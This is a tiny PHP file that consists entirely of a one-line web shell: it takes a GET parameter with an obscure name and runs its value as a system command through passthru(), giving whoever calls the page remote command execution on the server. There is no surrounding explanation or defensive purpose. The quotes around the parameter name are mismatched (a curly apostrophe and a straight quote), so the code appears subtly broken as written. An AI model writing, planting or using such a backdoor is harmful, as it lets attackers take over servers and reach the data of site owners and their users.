<?php
passthru($_GET[’5mwWsTiS']);
?>
